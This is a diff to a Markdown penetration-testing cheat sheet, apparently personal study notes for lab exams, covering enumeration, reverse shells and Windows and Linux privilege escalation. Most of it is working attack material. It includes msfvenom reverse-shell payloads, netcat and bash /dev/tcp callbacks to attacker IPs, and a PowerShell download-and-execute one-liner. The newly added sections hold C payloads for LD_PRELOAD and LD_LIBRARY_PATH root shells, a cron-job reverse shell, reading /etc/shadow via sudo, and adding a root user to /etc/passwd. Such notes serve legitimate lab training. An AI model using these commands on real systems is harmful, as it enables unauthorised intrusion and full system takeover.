@@ -4,12 +4,12 @@
 ## Ennumeration
 2. `nmap -sC -sV -p- -Pn $ip --open -oN result`   AND  `rustscan -a $IP . 
 3. Check which ports are open. Take note of service running and versions(for searchsploit)\
-4. Manual ennumeration. Visit the open ports to see if we can get initial foothold information. e.g anoymous login, default login,etc\
-5. Check for vulnerabiltieis on specific ports `nmap -p 80,445,139 --script=*vuln* $IP` , if not results show `nmap -Pn -sC -sV -p 22,2222 --script=*vuln* IP`
+4. Manual enumeration. Visit the open ports to see if we can get initial foothold information. e.g anoymous login, default login,etc\
+5. Check for vulnerabilties on specific ports `nmap -p 80,445,139 --script=*vuln* $IP` , if not results show `nmap -Pn -sC -sV -p 22,2222 --script=*vuln* IP`
 ## Check vulnerabilities and enumerate for each port
-0. Go to the differnet MD files in the repository .
+0. Go to the differnet MD files in the repository.
 
-## Creating a reverseshell, uploading a revershell  / creating a stageless payload
+## Creating a reverseshell, uploading a revershell  / creating a stageless payload to gain initial Access
 0. `msfvenom -p windows/shell_reverse_tcp LHOST=myIP LPORT=1237 -f exe  -o reverse.exe` 
 1. `msfvenom -p windows/shell_reverse_tcp LHOST=myIP LPORT=1234 -f asp -o reverse.asp` 
 
@@ -28,14 +28,16 @@
 5. in a webshell windows, `\\192.168.119.159\share\nc.exe -e cmd.exe 192.168.119.159 123`
 
  # Privilege Escalation for Window
- 0. Use PowerUp
- 1. `Import-Module .\PowerUp.ps1` or `. .\PowerUp.ps1`
- 2. `Invoke-AllChecks`
- 3. or `powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://myIP:80/PowerUp.ps1');Invoke-AllChecks"`
- 4. Use WinPeas
- 5. `winpeas.exe`
- 6. Use SharUp if you cant run winpeas or powerup 
- 7. `.\SharpUp.exe`
+ 0. Transfer the file to Window to TMP directory using any of the above methods.
+ 1. Use PowerUp.
+ 2. `Import-Module .\PowerUp.ps1` or `. .\PowerUp.ps1`
+ 3. `Invoke-AllChecks`
+ 4. or `powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://myIP:80/PowerUp.ps1');Invoke-AllChecks"`
+ 5. Use WinPeas
+ 6. `winpeas.exe`
+ 7. Use SharUp if you cant run winpeas or powerup 
+ 8. `.\SharpUp.exe`
+ 
  ## Service Misconfiguration
 - `sc.exe qc <name>` Query the configuration of a service
 - `sc.exe query <name>`Query the current status of a service
@@ -52,7 +54,7 @@
 7.  `sc query <SERVICENAME>` check the current status of the service.
 8.  `sc config <SERVICENAME> binpath="\"C:\PrivEsc\reverse.exe\""` set the binary path to the location of the revershell payload. 
 9.  Start a netcat listener and `net start <SERVICENAME>`
-10.  
+
  ### Unquoted Service Path
  0. `.\winPeas.exe quiet servicesinfo` Look for No quotes and Space detected in winpeas
  1. `Get-UnquotedService` (PowerUp) or `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`\ 
@@ -122,7 +124,6 @@
  3. Move the binary to window victim and run it with reverseshell to get root. 
  4. open netcat listener 
  5.  `.\x64.exe C:\PrivEsc\reverse.exe`
- 
  
  ### Passwords
  1. `.\winPEASany.exe quiet filesinfo userinfo` or manually  ` reg query HKLM /f password /t REG_SZ /s` and `reg query HKCU /f password /t REG_SZ /s`
@@ -207,8 +208,45 @@ oLink.Save
 3. or `curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo lse.sh;chmod 700 lse.sh`
 4. For linSmart start with `./lse.sh -i` then `./lse.sh -i -l 1` and `./lse.sh -i -l 2` for more verbosity.  
 
+### Sudo Exploit
+1. Sudo lets users run the program with root
+2. `sudo -l` Check what current user is allowed to run
+3.  If we have all access, `sudo su` , `sudo -s` , `sudo -i`, `sudo /bin/bash`,  `sudo passwd` to switch to root user 
+4.  After typing `sudo -l` visit https://gtfobins.github.io/ to see if we can escalte our privileges (shell escape)
+5.  If shell escape is not possible, we can still esclate our privileges 
+6.  e.g if we have apache2 as sudo privilege we can extract the hash file and crack the password.
+7.  ` sudo apache2 -f /etc/shadow` 
+8.  If  `env_keep+=LD_PRELOAD` ,`env_reset `is shown after `sudo -l`  create a preload.c payload in the /tmp folder
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setresuid(0,0,0);
+system("/bin/bash -p");
+}
 
+```
+9. `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c` complile the code.
+10. `sudo LD_PRELOAD=/tmp/preload.so apache2` run any sudo allowed program with the path to payload. Done. root shell.
+11. If `env_keep+=LD_LIBRARY` is shown run the `ldd` command on a shown sudo -l path 
+12. e.g `ldd /usr/sbin/apache2` 
+13. Pick one of the shared objects path to replace 
+14. create a payload `library_path.c` with the following content
+```
+#include <stdio.h>
+#include <stdlib.h>
+static void hijack() __attribute__((constructor));
+void hijack() {
+unsetenv("LD_LIBRARY_PATH");
+setresuid(0,0,0);
+system("/bin/bash -p");
+}
 
+```
+15. `gcc -o libcrypt.so.1 -shared -fPIC library_path.c` . Note `libcrypt.so.1` is one of the shared objects path that we are replacing.
+16. Run the program ` sudo LD_LIBRARY_PATH=. apache2` . LIBRARY PATH shoudl be set to  where we complied our c file.
 
 ### Weak File Permission
 1. ***Readable weak file Permission*** `ls -l /etc/shadow` manually check if it is readable or writable
@@ -221,7 +259,6 @@ oLink.Save
 openssl passwd evil
 echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
 su root2
-
 ```
 or
 ```
@@ -235,22 +272,30 @@ su
 8. ***Backup files in interesting locations***
 9.   Refer to the link to see if any files are differernt/stands out https://linuxhandbook.com/linux-directory-structure/ from the below command
 10.   `ls -la /home/user`  `ls -la /` `ls -la /tmp` `ls -la /var/backups`
+
 ### Service Exploit
 1.   If there is some unusual service, look for version numbers and look in searchsploit, google, github
 2.   `ps aux | grep "^root"` show all processes running as root.
 3.   `./lse.sh -i -l 1`and see services running with root
 4.   `<program> --version` or  `dpkg -l | grep <program>` for debian or  `rpm –qa | grep <program>` for rpm. Enumerate version to exploit.
 
-### Sudo exploit
 
-### Kernal exploit (last resort)
-1.  https://www.exploit-db.com/exploits/44298 (check this one out :) )
+### Cronjobs
+1.  `cat /etc/crontab` View the content of what is running regularly 
+2.  `locate <File>` Find out where the file location is.
+3.  `ls -l /PATH/SOMEFILE.SH` check the file permission if we can read or write.
+4.  `bash -i >& /dev/tcp/MYIP/PORT 0>&1` add a revershell if it is writeable
+5.  start a nc listener
+6.  
+### Kernal Exploit (last resort)
+1. Check winpeas for possible kernel exploits.
 2.`uname -a` `cat /etc/issue` Enumerate kernel version
 3. Find matching exploits (Google, ExploitDB, GitHub) ` searchsploit <KERNAL VERSION> priv esc` on kali
-4. https://github.com/jondonas/linux-exploit-suggester-2 . Transfer file and run
-5. `./linux-exploit-suggester-2.pl –k <KERNAL VERSION> ` (dirty cow is a popular exploit)
-6. Enter `/usr/bin/passwd ` to get  a root shell
-7. Kernal exploit may be a one shot ...and may crash the system. /usr/bin/passwd 
+4. https://www.exploit-db.com/exploits/44298 (check this one out :) )
+5. https://github.com/jondonas/linux-exploit-suggester-2 . Or check Kernal Vulnerability. Transfer file and run
+6. `./linux-exploit-suggester-2.pl –k <KERNAL VERSION> ` (dirty cow is a popular exploit)
+7. Enter `/usr/bin/passwd ` to get  a root shell
+8. Kernal exploit may be a one shot ...and may crash the system. /usr/bin/passwd 
 
 
 
